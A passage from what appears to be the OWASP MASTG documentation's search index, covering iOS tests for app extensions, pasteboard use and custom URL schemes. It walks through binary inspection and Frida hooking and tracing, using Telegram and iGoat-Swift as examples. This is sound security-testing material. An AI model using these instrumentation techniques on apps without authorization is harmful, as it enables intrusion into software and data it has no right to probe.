moveItemAtPath:toPath:error:]\nmoveItemAtPath: /var/mobile/Library/Application Support/Containers\n                            /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf\ntoPath: /var/mobile/Documents/OWASP_MASVS (1).pdf\nerror: 0x16f095bf8\n0x100f24e90 SomeFileManager!-[AppDelegate __handleOpenURL:]\n0x100f25198 SomeFileManager!-[AppDelegate application:openURL:options:]\n0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n...\n0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__\nRET: 0x1\n</code></pre> <p>If you look at the stack trace, you can see how <code>application:openURL:options:</code> called <code>__handleOpenURL:</code>, which called <code>moveItemAtPath:toPath:error:</code>. Notice that we have now this information without having the source code for the target app. The first thing that we had to do was clear: hook <code>application:openURL:options:</code>. Regarding the rest, we had to think a little bit and come up with methods that we could start tracing and are related to the file manager, for example, all methods containing the strings \"copy\", \"move\", \"remove\", etc. until we have found that the one being called was <code>moveItemAtPath:toPath:error:</code>.</p> <p>A final thing worth noticing here is that this way of handling incoming files is the same for custom URL schemes. Please refer to  Testing Custom URL Schemes for more information.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/","title":"MASTG-TEST-0072: Testing App Extensions","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0072: Testing App Extensions (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#static-analysis","title":"Static Analysis","text":"<p>The static analysis will take care of:</p> <ul> <li>Verifying if the app contains app extensions</li> <li>Determining the supported data types</li> <li>Checking data sharing with the containing app</li> <li>Verifying if the app restricts the use of app extensions</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#verifying-if-the-app-contains-app-extensions","title":"Verifying if the App Contains App Extensions","text":"<p>If you have the original source code you can search for all occurrences of <code>NSExtensionPointIdentifier</code> with Xcode (cmd+shift+f) or take a look into \"Build Phases / Embed App extensions\":</p> <p></p> <p>There you can find the names of all embedded app extensions followed by <code>.appex</code>, now you can navigate to the individual app extensions in the project.</p> <p>If not having the original source code:</p> <p>Grep for <code>NSExtensionPointIdentifier</code> among all files inside the app bundle (IPA or installed app):</p> <pre><code>$ grep -nr NSExtensionPointIdentifier Payload/Telegram\\ X.app/\nBinary file Payload/Telegram X.app//PlugIns/SiriIntents.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/Share.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/NotificationContent.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/Widget.appex/Info.plist matches\nBinary file Payload/Telegram X.app//Watch/Watch.app/PlugIns/Watch Extension.appex/Info.plist matches\n</code></pre> <p>You can also access per SSH, find the app bundle and list all inside PlugIns (they are placed there by default) or do it with objection:</p> <pre><code>ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # cd PlugIns\n    /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/\n    Telegram X.app/PlugIns\n\nph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # ls\nNSFileType      Perms  NSFileProtection    Read    Write     Name\n------------  -------  ------------------  ------  -------   -------------------------\nDirectory         493  None                True    False     NotificationContent.appex\nDirectory         493  None                True    False     Widget.appex\nDirectory         493  None                True    False     Share.appex\nDirectory         493  None                True    False     SiriIntents.appex\n</code></pre> <p>We can see now the same four app extensions that we saw in Xcode before.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#determining-the-supported-data-types","title":"Determining the Supported Data Types","text":"<p>This is important for data being shared with host apps (e.g. via Share or Action Extensions). When the user selects some data type in a host app and it matches the data types define here, the host app will offer the extension. It is worth noticing the difference between this and data sharing via <code>UIActivity</code> where we had to define the document types, also using UTIs. An app does not need to have an extension for that. It is possible to share data using only <code>UIActivity</code>.</p> <p>Inspect the app extension's <code>Info.plist</code> file and search for <code>NSExtensionActivationRule</code>. That key specifies the data being supported as well as e.g. maximum of items supported. For example:</p> <pre><code>&lt;key&gt;NSExtensionAttributes&lt;/key&gt;\n    &lt;dict&gt;\n        &lt;key&gt;NSExtensionActivationRule&lt;/key&gt;\n        &lt;dict&gt;\n            &lt;key&gt;NSExtensionActivationSupportsImageWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;10&lt;/integer&gt;\n            &lt;key&gt;NSExtensionActivationSupportsMovieWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;1&lt;/integer&gt;\n            &lt;key&gt;NSExtensionActivationSupportsWebURLWithMaxCount&lt;/key&gt;\n            &lt;integer&gt;1&lt;/integer&gt;\n        &lt;/dict&gt;\n    &lt;/dict&gt;\n</code></pre> <p>Only the data types present here and not having <code>0</code> as <code>MaxCount</code> will be supported. However, more complex filtering is possible by using a so-called predicate string that will evaluate the UTIs given. Please refer to the Apple App Extension Programming Guide for more detailed information about this.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#checking-data-sharing-with-the-containing-app","title":"Checking Data Sharing with the Containing App","text":"<p>Remember that app extensions and their containing apps do not have direct access to each other's containers. However, data sharing can be enabled. This is done via \"App Groups\" and the <code>NSUserDefaults</code> API. See this figure from Apple App Extension Programming Guide:</p> <p></p> <p>As also mentioned in the guide, the app must set up a shared container if the app extension uses the <code>NSURLSession</code> class to perform a background upload or download, so that both the extension and its containing app can access the transferred data.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#verifying-if-the-app-restricts-the-use-of-app-extensions","title":"Verifying if the App Restricts the Use of App Extensions","text":"<p>It is possible to reject a specific type of app extension by using the following method:</p> <ul> <li><code>application:shouldAllowExtensionPointIdentifier:</code></li> </ul> <p>However, it is currently only possible for \"custom keyboard\" app extensions (and should be verified when testing apps handling sensitive data via the keyboard like e.g. banking apps).</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>For the dynamic analysis we can do the following to gain knowledge without having the source code:</p> <ul> <li>Inspecting the items being shared</li> <li>Identifying the app extensions involved</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#inspecting-the-items-being-shared","title":"Inspecting the Items Being Shared","text":"<p>For this we should hook <code>NSExtensionContext - inputItems</code> in the data originating app.</p> <p>Following the previous example of Telegram we will now use the \"Share\" button on a text file (that was received from a chat) to create a note in the Notes app with it:</p> <p></p> <p>If we run a trace, we'd see the following output:</p> <pre><code>(0x1c06bb420) NSExtensionContext - inputItems\n0x18284355c Foundation!-[NSExtension _itemProviderForPayload:extensionContext:]\n0x1828447a4 Foundation!-[NSExtension _loadItemForPayload:contextIdentifier:completionHandler:]\n0x182973224 Foundation!__NSXPCCONNECTION_IS_CALLING_OUT_TO_EXPORTED_OBJECT_S3__\n0x182971968 Foundation!-[NSXPCConnection _decodeAndInvokeMessageWithEvent:flags:]\n0x182748830 Foundation!message_handler\n0x181ac27d0 libxpc.dylib!_xpc_connection_call_event_handler\n0x181ac0168 libxpc.dylib!_xpc_connection_mach_event\n...\nRET: (\n\"&lt;NSExtensionItem: 0x1c420a540&gt; - userInfo:\n{\n    NSExtensionItemAttachmentsKey =     (\n    \"&lt;NSItemProvider: 0x1c46b30e0&gt; {types = (\\n \\\"public.plain-text\\\",\\n \\\"public.file-url\\\"\\n)}\"\n    );\n}\"\n)\n</code></pre> <p>Here we can observe that:</p> <ul> <li>This occurred under-the-hood via XPC, concretely it is implemented via a <code>NSXPCConnection</code> that uses the <code>libxpc.dylib</code> Framework.</li> <li>The UTIs included in the <code>NSItemProvider</code> are <code>public.plain-text</code> and <code>public.file-url</code>, the latter being included in <code>NSExtensionActivationRule</code> from the <code>Info.plist</code> of the \"Share Extension\" of Telegram.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0072/#identifying-the-app-extensions-involved","title":"Identifying the App Extensions Involved","text":"<p>You can also find out which app extension is taking care of your the requests and responses by hooking <code>NSExtension - _plugIn</code>:</p> <p>We run the same example again:</p> <pre><code>(0x1c0370200) NSExtension - _plugIn\nRET: &lt;PKPlugin: 0x1163637f0 ph.telegra.Telegraph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785\n1(2) /private/var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35\n/Telegram X.app/PlugIns/Share.appex&gt;\n\n(0x1c0372300)  -[NSExtension _plugIn]\nRET: &lt;PKPlugin: 0x10bff7910 com.apple.mobilenotes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83\nF90A1414DC 1(2) /private/var/containers/Bundle/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D\n/MobileNotes.app/PlugIns/com.apple.mobilenotes.SharingExtension.appex&gt;\n</code></pre> <p>As you can see there are two app extensions involved:</p> <ul> <li><code>Share.appex</code> is sending the text file (<code>public.plain-text</code> and <code>public.file-url</code>).</li> <li><code>com.apple.mobilenotes.SharingExtension.appex</code> which is receiving and will process the text file.</li> </ul> <p>If you want to learn more about what's happening under-the-hood in terms of XPC, we recommend to take a look at the internal calls from \"libxpc.dylib\". For example you can use <code>frida-trace</code> and then dig deeper into the methods that you find more interesting by extending the automatically generated stubs.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/","title":"MASTG-TEST-0073: Testing UIPasteboard","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Use of the iOS General Pasteboard</li> <li> Sensitive Data in the iOS General Pasteboard at Runtime</li> <li> Pasteboard Contents Not Cleared After Use</li> <li> Pasteboard Contents Not Expiring</li> <li> Pasteboard Contents Not Restricted to Local Device</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#static-analysis","title":"Static Analysis","text":"<p>The systemwide general pasteboard can be obtained by using <code>generalPasteboard</code>, search the source code or the compiled binary for this method. Using the systemwide general pasteboard should be avoided when dealing with sensitive data.</p> <p>Custom pasteboards can be created with <code>pasteboardWithName:create:</code> or <code>pasteboardWithUniqueName</code>. Verify if custom pasteboards are set to be persistent as this is deprecated since iOS 10. A shared container should be used instead.</p> <p>In addition, the following can be inspected:</p> <ul> <li>Check if pasteboards are being removed with <code>removePasteboardWithName:</code>, which invalidates an app pasteboard, freeing up all resources used by it (no effect for the general pasteboard).</li> <li>Check if there are excluded pasteboards, there should be a call to <code>setItems:options:</code> with the <code>UIPasteboardOptionLocalOnly</code> option.</li> <li>Check if there are expiring pasteboards, there should be a call to <code>setItems:options:</code> with the <code>UIPasteboardOptionExpirationDate</code> option.</li> <li>Check if the app clears the pasteboard items when going to background or when terminating. This is done by some password manager apps trying to restrict sensitive data exposure.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#dynamic-analysis","title":"Dynamic Analysis","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#detect-pasteboard-usage","title":"Detect Pasteboard Usage","text":"<p>Hook or trace the following:</p> <ul> <li><code>generalPasteboard</code> for the system-wide general pasteboard.</li> <li><code>pasteboardWithName:create:</code> and <code>pasteboardWithUniqueName</code> for custom pasteboards.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#detect-persistent-pasteboard-usage","title":"Detect Persistent Pasteboard Usage","text":"<p>Hook or trace the deprecated <code>setPersistent:</code> method and verify if it's being called.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0073/#monitoring-and-inspecting-pasteboard-items","title":"Monitoring and Inspecting Pasteboard Items","text":"<p>To monitor and inspect pasteboard items at runtime you can follow the instructions from  Monitoring the Pasteboard.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-4","masvs-platform-1","deprecated"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/","title":"MASTG-TEST-0075: Testing Custom URL Schemes","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0075: Testing Custom URL Schemes (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#static-analysis","title":"Static Analysis","text":"<p>There are a couple of things that we can do using static analysis. In the next sections we will see the following:</p> <ul> <li>Testing custom URL schemes registration</li> <li>Testing application query schemes registration</li> <li>Testing URL handling and validation</li> <li>Testing URL requests to other apps</li> <li>Testing for deprecated methods</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-custom-url-schemes-registration","title":"Testing Custom URL Schemes Registration","text":"<p>The first step to test custom URL schemes is finding out whether an application registers any protocol handlers.</p> <p>If you have the original source code and want to view registered protocol handlers, simply open the project in Xcode, go to the Info tab and open the URL Types section as presented in the screenshot below:</p> <p></p> <p>Also in Xcode you can find this by searching for the <code>CFBundleURLTypes</code> key in the app's <code>Info.plist</code> file (example from  iGoat-Swift):</p> <pre><code>&lt;key&gt;CFBundleURLTypes&lt;/key&gt;\n&lt;array&gt;\n    &lt;dict&gt;\n        &lt;key&gt;CFBundleURLName&lt;/key&gt;\n        &lt;string&gt;com.iGoat.myCompany&lt;/string&gt;\n        &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;\n        &lt;array&gt;\n            &lt;string&gt;iGoat&lt;/string&gt;\n        &lt;/array&gt;\n    &lt;/dict&gt;\n&lt;/array&gt;\n</code></pre> <p>In a compiled application (or IPA), registered protocol handlers are found in the file <code>Info.plist</code> in the app bundle's root folder. Open it and search for the <code>CFBundleURLSchemes</code> key, if present, it should contain an array of strings (example from  iGoat-Swift):</p> <pre><code>grep -A 5 -nri urlsch Info.plist\nInfo.plist:45:    &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;\nInfo.plist-46-    &lt;array&gt;\nInfo.plist-47-        &lt;string&gt;iGoat&lt;/string&gt;\nInfo.plist-48-    &lt;/array&gt;\n</code></pre> <p>Once the URL scheme is registered, other apps can open the app that registered the scheme, and pass parameters by creating appropriately formatted URLs and opening them with the <code>UIApplication openURL:options:completionHandler:</code> method.</p> <p>Note from the App Programming Guide for iOS:</p> <p>If more than one third-party app registers to handle the same URL scheme, there is currently no process for determining which app will be given that scheme.</p> <p>This could lead to a URL scheme hijacking attack (see page 136 in [#thiel2]).</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-application-query-schemes-registration","title":"Testing Application Query Schemes Registration","text":"<p>Before calling the <code>openURL:options:completionHandler:</code> method, apps can call <code>canOpenURL:</code> to verify that the target app is available. However, as this method was being used by malicious app as a way to enumerate installed apps, from iOS 9.0 the URL schemes passed to it must be also declared by adding the <code>LSApplicationQueriesSchemes</code> key to the app's <code>Info.plist</code> file and an array of up to 50 URL schemes.</p> <pre><code>&lt;key&gt;LSApplicationQueriesSchemes&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;url_scheme1&lt;/string&gt;\n        &lt;string&gt;url_scheme2&lt;/string&gt;\n    &lt;/array&gt;\n</code></pre> <p><code>canOpenURL</code> will always return <code>NO</code> for undeclared schemes, whether or not an appropriate app is installed. However, this restriction only applies to <code>canOpenURL</code>.</p> <p>The <code>openURL:options:completionHandler:</code> method will still open any URL scheme, even if the <code>LSApplicationQueriesSchemes</code> array was declared, and return <code>YES</code> / <code>NO</code> depending on the result.</p> <p>As an example, Telegram declares in its <code>Info.plist</code> these Queries Schemes, among others:</p> <pre><code>    &lt;key&gt;LSApplicationQueriesSchemes&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;dbapi-3&lt;/string&gt;\n        &lt;string&gt;instagram&lt;/string&gt;\n        &lt;string&gt;googledrive&lt;/string&gt;\n        &lt;string&gt;comgooglemaps-x-callback&lt;/string&gt;\n        &lt;string&gt;foursquare&lt;/string&gt;\n        &lt;string&gt;here-location&lt;/string&gt;\n        &lt;string&gt;yandexmaps&lt;/string&gt;\n        &lt;string&gt;yandexnavi&lt;/string&gt;\n        &lt;string&gt;comgooglemaps&lt;/string&gt;\n        &lt;string&gt;youtube&lt;/string&gt;\n        &lt;string&gt;twitter&lt;/string&gt;\n        ...\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-url-handling-and-validation","title":"Testing URL Handling and Validation","text":"<p>In order to determine how a URL path is built and validated, if you have the original source code, you can search for the following methods:</p> <ul> <li><code>application:didFinishLaunchingWithOptions:</code> method or <code>application:will-FinishLaunchingWithOptions:</code>: verify how the decision is made and how the information about the URL is retrieved.</li> <li><code>application:openURL:options:</code>: verify how the resource is being opened, i.e. how the data is being parsed, verify the options, especially if access by the calling app (<code>sourceApplication</code>) should be allowed or denied. The app might also need user permission when using the custom URL scheme.</li> </ul> <p>In Telegram you will find four different methods being used:</p> <pre><code>func application(_ application: UIApplication, open url: URL, sourceApplication: String?) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ application: UIApplication, open url: URL, sourceApplication: String?,\nannotation: Any) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ app: UIApplication, open url: URL,\noptions: [UIApplicationOpenURLOptionsKey : Any] = [:]) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n\nfunc application(_ application: UIApplication, handleOpen url: URL) -&gt; Bool {\n    self.openUrl(url: url)\n    return true\n}\n</code></pre> <p>We can observe some things here:</p> <ul> <li>The app implements also deprecated methods like <code>application:handleOpenURL:</code> and <code>application:openURL:sourceApplication:annotation:</code>.</li> <li>The source application is not being verified in any of those methods.</li> <li>All of them call a private <code>openUrl</code> method. You can inspect it to learn more about how the URL request is handled.</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-url-requests-to-other-apps","title":"Testing URL Requests to Other Apps","text":"<p>The method <code>openURL:options:completionHandler:</code> and the deprecated <code>openURL:</code> method of <code>UIApplication</code> are responsible for opening URLs (i.e. to send requests / make queries to other apps) that may be local to the current app or it may be one that must be provided by a different app. If you have the original source code you can search directly for usages of those methods.</p> <p>Additionally, if you are interested into knowing if the app is querying specific services or apps, and if the app is well-known, you can also search for common URL schemes online and include them in your greps. For example, a quick Google search reveals:</p> <pre><code>Apple Music - music:// or musics:// or audio-player-event://\nCalendar - calshow:// or x-apple-calevent://\nContacts - contacts://\nDiagnostics - diagnostics:// or diags://\nGarageBand - garageband://\niBooks - ibooks:// or itms-books:// or itms-bookss://\nMail - message:// or mailto://emailaddress\nMessages - sms://phonenumber\nNotes - mobilenotes://\n...\n</code></pre> <p>We search for this method in the Telegram source code, this time without using Xcode, just with <code>egrep</code>:</p> <pre><code>$ egrep -nr \"open.*options.*completionHandler\" ./Telegram-iOS/\n\n./AppDelegate.swift:552: return UIApplication.shared.open(parsedUrl,\n    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n    completionHandler: { value in\n./AppDelegate.swift:556: return UIApplication.shared.open(parsedUrl,\n    options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n    completionHandler: { value in\n</code></pre> <p>If we inspect the results we will see that <code>openURL:options:completionHandler:</code> is actually being used for universal links, so we have to keep searching. For example, we can search for <code>openURL(</code>:</p> <pre><code>$ egrep -nr \"openURL\\(\" ./Telegram-iOS/\n\n./ApplicationContext.swift:763:  UIApplication.shared.openURL(parsedUrl)\n./ApplicationContext.swift:792:  UIApplication.shared.openURL(URL(\n                                        string: \"https://telegram.org/deactivate?phone=\\(phone)\")!\n                                 )\n./AppDelegate.swift:423:         UIApplication.shared.openURL(url)\n./AppDelegate.swift:538:         UIApplication.shared.openURL(parsedUrl)\n...\n</code></pre> <p>If we inspect those lines we will see how this method is also being used to open \"Settings\" or to open the \"App Store Page\".</p> <p>When just searching for <code>://</code> we see:</p> <pre><code>if documentUri.hasPrefix(\"file://\"), let path = URL(string: documentUri)?.path {\nif !url.hasPrefix(\"mt-encrypted-file://?\") {\nguard let dict = TGStringUtils.argumentDictionary(inUrlString: String(url[url.index(url.startIndex,\n    offsetBy: \"mt-encrypted-file://?\".count)...])) else {\nparsedUrl = URL(string: \"https://\\(url)\")\nif let url = URL(string: \"itms-apps://itunes.apple.com/app/id\\(appStoreId)\") {\n} else if let url = url as? String, url.lowercased().hasPrefix(\"tg://\") {\n[[WKExtension sharedExtension] openSystemURL:[NSURL URLWithString:[NSString\n    stringWithFormat:@\"tel://%@\", userHandle.data]]];\n</code></pre> <p>After combining the results of both searches and carefully inspecting the source code we find the following piece of code:</p> <pre><code>openUrl: { url in\n            var parsedUrl = URL(string: url)\n            if let parsed = parsedUrl {\n                if parsed.scheme == nil || parsed.scheme!.isEmpty {\n                    parsedUrl = URL(string: \"https://\\(url)\")\n                }\n                if parsed.scheme == \"tg\" {\n                    return\n                }\n            }\n\n            if let parsedUrl = parsedUrl {\n                UIApplication.shared.openURL(parsedUrl)\n</code></pre> <p>Before opening a URL, the scheme is validated, \"https\" will be added if necessary and it won't open any URL with the \"tg\" scheme. When ready it will use the deprecated <code>openURL</code> method.</p> <p>If only having the compiled application (IPA) you can still try to identify which URL schemes are being used to query other apps:</p> <ul> <li>Check if <code>LSApplicationQueriesSchemes</code> was declared or search for common URL schemes.</li> <li>Also use the string <code>://</code> or build a regular expression to match URLs as the app might not be declaring some schemes.</li> </ul> <p>You can do that by first verifying that the app binary contains those strings by e.g. using unix <code>strings</code> command:</p> <pre><code>strings &lt;yourapp&gt; | grep \"someURLscheme://\"\n</code></pre> <p>or even better, use radare2's <code>iz/izz</code> command or rafind2, both will find strings where the unix <code>strings</code> command won't. Example from  iGoat-Swift:</p> <pre><code>$ r2 -qc izz~iGoat:// iGoat-Swift\n37436 0x001ee610 0x001ee610  23  24 (4.__TEXT.__cstring) ascii iGoat://?contactNumber=\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#testing-for-deprecated-methods","title":"Testing for Deprecated Methods","text":"<p>Search for deprecated methods like:</p> <ul> <li><code>application:handleOpenURL:</code></li> <li><code>openURL:</code></li> <li><code>application:openURL:sourceApplication:annotation:</code></li> </ul> <p>For example, using  rabin2 we find those three:</p> <pre><code>$ rabin2 -zzq Telegram\\ X.app/Telegram\\ X | grep -i \"openurl\"\n\n0x1000d9e90 31 30 UIApplicationOpenURLOptionsKey\n0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:\n0x1000dee71 29 28 application:openURL:options:\n0x1000dee8e 27 26 application:handleOpenURL:\n0x1000df2c9 9 8 openURL:\n0x1000df766 12 11 canOpenURL:\n0x1000df772 35 34 openURL:options:completionHandler:\n...\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Once you've identified the custom URL schemes the app has registered, there are several methods that you can use to test them:</p> <ul> <li>Performing URL requests</li> <li>Identifying and hooking the URL handler method</li> <li>Testing URL schemes source validation</li> <li>Fuzzing URL schemes</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#performing-url-requests","title":"Performing URL Requests","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#using-safari","title":"Using Safari","text":"<p>To quickly test one URL scheme you can open the URLs on Safari and observe how the app behaves. For example, if you write <code>tel://123456789</code> in the address bar of Safari, a pop up will appear with the telephone number and the options \"Cancel\" and \"Call\". If you press \"Call\" it will open the Phone app and directly make the call.</p> <p>You may also know already about pages that trigger custom URL schemes, you can just navigate normally to those pages and Safari will automatically ask when it finds a custom URL scheme.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#using-the-notes-app","title":"Using the Notes App","text":"<p>As already seen in \"Triggering Universal Links\", you may use the Notes app and long press the links you've written in order to test custom URL schemes. Remember to exit the editing mode in order to be able to open them. Note that you can click or long press links including custom URL schemes only if the app is installed, if not they won't be highlighted as clickable links.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#using-frida","title":"Using Frida","text":"<p>If you simply want an app to open the URL scheme you can do it using Frida. Example using  iGoat-Swift:</p> <pre><code>$ frida -U iGoat-Swift\n\n[iPhone::iGoat-Swift]-&gt; function openURL(url) {\n                            var UIApplication = ObjC.classes.UIApplication.sharedApplication();\n                            var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n                            return UIApplication.openURL_(toOpen);\n                        }\n[iPhone::iGoat-Swift]-&gt; openURL(\"tel://234234234\")\ntrue\n</code></pre> <p>In this example from Frida CodeShare the author uses the non-public API <code>LSApplication Workspace.openSensitiveURL:withOptions:</code> to open the URLs (from the SpringBoard app):</p> <pre><code>function openURL(url) {\n    var w = ObjC.classes.LSApplicationWorkspace.defaultWorkspace();\n    var toOpen = ObjC.classes.NSURL.URLWithString_(url);\n    return w.openSensitiveURL_withOptions_(toOpen, null);\n}\n</code></pre> <p>Note that the use of non-public APIs is not permitted on the App Store, that's why we don't even test these but we are allowed to use them for our dynamic analysis.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#identifying-and-hooking-the-url-handler-method","title":"Identifying and Hooking the URL Handler Method","text":"<p>If you can't look into the original source code you will have to find out yourself which method does the app use to handle the URL scheme requests that it receives. You cannot know if it is an Objective-C method or a Swift one, or even if the app is using a deprecated one.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-3","masvs-platform-1"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#crafting-the-link-yourself-and-letting-safari-open-it","title":"Crafting the Link Yourself and Letting Safari Open It","text":"<p>For this we will use the ObjC method observer from Frida CodeShare, which is an extremely handy script that allows you to quickly observe any collection of methods or classes just by providing a simple pattern.</p> <p>In this case we are interested into all methods from the  iGoat-Swift app containing \"openURL\", therefore our pattern will be <code>*[* *openURL*]</code>:</p> <ul> <li>The first asterisk will match all instance <code>-</code> and class <code>+</code> methods.</li> <li>The second matches all Objective-C classes.</li> <li>The third and forth allow to match any method containing the string <code>openURL</code>.</li> </ul> <pre><code>$ frida -U iGoat-Swift --codeshare mrmacete/objc-method-observer\n\n[iPhone::iGoat-Swift]-&gt; observeSomething(\"*[* *openURL*]\");\nObserving  -[_UIDICActivityItemProvider activityViewController:openURLAnnotationForActivityType:]\nObserving  -[CNQuickActionsManager _openURL:]\nObserving  